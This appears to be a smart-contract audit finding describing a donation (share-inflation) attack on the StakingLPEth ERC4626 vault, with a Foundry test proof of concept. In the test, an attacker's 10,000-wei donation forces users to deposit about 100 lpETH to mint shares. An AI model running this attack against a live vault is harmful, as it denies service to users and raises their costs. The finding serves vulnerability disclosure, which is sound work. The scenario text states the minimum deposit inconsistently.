# Vulnerability details


## Impact
The attack renders StakingLPEth unusable, resulting in a Denial of Service (DoS).

## Proof of Concept
```javascript
  function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override nonReentrant {
        super._deposit(caller, receiver, assets, shares);
@>        _checkMinShares();
    }
```

Although _checkMinShares() has been added to the _deposit() and _withdraw() functions to ensure that a small non-zero amount of shares does not remain, it does not address the exposure to donation attacks.
Because in ERC4626::totalAssets(),
```javascript
function totalAssets() public view virtual override returns (uint256) {
        return _asset.balanceOf(address(this));
    }
```

Attack Scenario:

	1.	After the StakingLPEth contract is deployed, the attacker donates 10,000 wei of lpETH.
	2.	Due to the _checkMinShares() function, the minimum staking value increases to 100.01e18 lpETH tokens. Now, a user needs to stake the amount of 100.1 ether  lpETH tokens to receive just 0.01 ether in shares.


#### poc
```javascript
function testInflationAttack() public{

        address attacker = vm.addr(0x3344);
        liquidityPool.transfer(attacker, 10000 wei);

        //donation attake
        vm.startPrank(attacker);
        liquidityPool.transfer(address(stakingLpEth), 10000 wei);
        vm.stopPrank();

        //revert because of MinSharesViolation
        vm.startPrank(user1);
        liquidityPool.approve(address(stakingLpEth), 0.01 ether);
        vm.expectRevert(StakingLPEth.MinSharesViolation.selector);
        stakingLpEth.deposit(0.01 ether, user1);
        vm.stopPrank();

        //min deposit amount is 100 e18, get 0.01e18 share
        liquidityPool.transfer(user1, 100.01 ether);
        vm.startPrank(user1);
        liquidityPool.approve(address(stakingLpEth), 100.01 ether );
        stakingLpEth.deposit(100.01 ether , user1);
        vm.stopPrank();

        console.log(stakingLpEth.balanceOf(user1));
    
    }
```
